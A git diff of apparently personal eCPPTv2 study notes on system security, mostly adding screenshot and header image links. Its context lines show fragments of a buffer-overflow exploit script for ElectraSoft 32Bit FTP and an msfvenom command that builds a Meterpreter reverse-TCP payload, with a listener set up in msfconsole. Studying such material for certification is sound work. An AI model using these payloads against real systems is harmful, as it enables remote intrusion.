@@ -2,8 +2,8 @@
 title: "1 - System Security"
 classes: single
 header:  
-  teaser: "/assets/images/posts/brazilian.jpg"
-  overlay_image: "/assets/images/posts/brazilian.jpg"
+  teaser: "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser.jpg"
+  overlay_image: "/assets/images/main/menu.jpg"
   overlay_filter: 0.5  
 ribbon: DarkSlateBlue
 excerpt: "eCPPTv2"
@@ -468,7 +468,7 @@ objdump -d -Mintel file.exe > disasm.txt
 
 ### Immunity Debugger
 
-
+![Alt text](/assets/images/posts/2023-11-19-ecppt/1.png){: .align-center}
 
 1 - Panel
 Where assembler code is produced or viewed when you are debugging a module.
@@ -740,7 +740,9 @@ in this case: 0x77267D3B = \x3B\x7D\x26\x77
 
 ## Exploiting a Real-World Buffer Overflow
 - ElectraSoft 32Bit FTP
+
 ```bash
+
 #!/usr/bin/python
 
 from socket import *
@@ -760,6 +762,7 @@ c.recv(1024)
 c.close()
 print "[+] Client exploited !! quitting"
 s.close()
+
 ```
 
 > In order to this to work, we had to execute in the same box both the script and the vuln server
@@ -846,12 +849,15 @@ https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypa
 
 NOP-Sled
 
+![Alt text](/assets/images/posts/2023-11-19-ecppt/2.png){: .align-center}
 
 DEP
 
+![Alt text](/assets/images/posts/2023-11-19-ecppt/3.png){: .align-center}
 
 Canary
 
+![Alt text](/assets/images/posts/2023-11-19-ecppt/4.png){: .align-center}
 
 
 # Shellcoding
@@ -942,7 +948,7 @@ sometimes, target process filters out all non-alphanumeric bytes from the data. 
 
 Example Null-free encoding:
 
-
+![Alt text](/assets/images/posts/2023-11-19-ecppt/5.png){: .align-center}
 
 > From this, you should notice that the first instruction (mov eax, 0) should be avoided because it has zeroes within its machine code representation.
 
@@ -1414,7 +1420,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> lport=<port> -f c
 
 > We should open a listener in msfconsole > exploit/multi/handler
 
-
+![Alt text](/assets/images/posts/2023-11-19-ecppt/6.png){: .align-center}
 
 
 
@@ -1422,7 +1428,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> lport=<port> -f c
 
 - The art of share information in a secret manner
 
-	
+![Alt text](/assets/images/posts/2023-11-19-ecppt/16.png){: .align-center}
 	
 
 Encryption is the process of transforming a message into a ciphertext.	
@@ -1488,12 +1494,15 @@ ps: this is a deprecated mode
 
 public/private key
 
+![Alt text](/assets/images/posts/2023-11-19-ecppt/7.png){: .align-center}
 
 ECB - Eletronic Code Book
 
+![Alt text](/assets/images/posts/2023-11-19-ecppt/8.png){: .align-center}
 
 CBC - Cipher Block Chaining
 
+![Alt text](/assets/images/posts/2023-11-19-ecppt/9.png){: .align-center}
 
 
 ## Cryptographic Hash Function
@@ -1561,13 +1570,16 @@ It proves that the message is effectively coming from a given sender.
 	http://www.win.tue.nl/hashclash/rogue-ca/
 
 
+![Alt text](/assets/images/posts/2023-11-19-ecppt/10.png){: .align-center}
 
+![Alt text](/assets/images/posts/2023-11-19-ecppt/11.png){: .align-center}
 
-
-
+![Alt text](/assets/images/posts/2023-11-19-ecppt/12.png){: .align-center}
 
 
 digital signature:
+
+![Alt text](/assets/images/posts/2023-11-19-ecppt/13.png){: .align-center}
 
 
 ## Pretty Good Privacy (PGP)
@@ -1616,6 +1628,8 @@ The message is then encrypted with the symmetric key.
 
 
 The two approaches to Trust
+
+![Alt text](/assets/images/posts/2023-11-19-ecppt/14.png){: .align-center}
 
 
 ## Secure Shell (SSH)
@@ -1949,6 +1963,7 @@ optical keylogger:
 	can be local or remote, and can provide access to other malwares
 
 
+![Alt text](/assets/images/posts/2023-11-19-ecppt/15.png){: .align-center}
 
 
 
